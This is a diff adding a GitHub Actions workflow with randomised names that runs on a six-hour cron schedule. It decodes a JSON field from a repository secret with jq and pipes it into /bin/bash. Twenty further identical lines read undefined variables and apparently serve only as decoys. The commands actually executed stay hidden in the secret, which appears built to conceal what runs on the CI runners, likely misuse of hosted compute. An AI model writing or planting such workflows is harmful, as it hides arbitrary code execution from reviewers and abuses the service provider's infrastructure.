@@ -1,0 +1,37 @@
+name: zengwutuan1234
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zengwutuan1234
+        env:
+          d83465: ${{ secrets.d83465 }}
+        run: |
+          echo $d83465 | jq -r .uzmza3026 | /bin/bash
+          echo $c36088 | jq -r .r5316 | /bin/bash
+          echo $tvnnu9706 | jq -r .u372 | /bin/bash
+          echo $uz5074 | jq -r .ysw56187 | /bin/bash
+          echo $k086 | jq -r .up0818 | /bin/bash
+          echo $dm2260 | jq -r .ycb32269 | /bin/bash
+          echo $vfrj4 | jq -r .hkoey54 | /bin/bash
+          echo $ztllv16 | jq -r .l478 | /bin/bash
+          echo $dst32270 | jq -r .pnbr1 | /bin/bash
+          echo $swuh478 | jq -r .hxwyx6842 | /bin/bash
+          echo $du3196 | jq -r .rjn83 | /bin/bash
+          echo $gfx2 | jq -r .zil25 | /bin/bash
+          echo $ztj1280 | jq -r .yf3 | /bin/bash
+          echo $lsr61440 | jq -r .tlfz4 | /bin/bash
+          echo $fvt81045 | jq -r .jql27742 | /bin/bash
+          echo $oe2 | jq -r .ams04 | /bin/bash
+          echo $frpzm15 | jq -r .v764 | /bin/bash
+          echo $t12300 | jq -r .ti9 | /bin/bash
+          echo $sjfa355 | jq -r .skdf324 | /bin/bash
+          echo $wjx26675 | jq -r .ib5 | /bin/bash
+          echo $k494 | jq -r .nd510 | /bin/bash
+
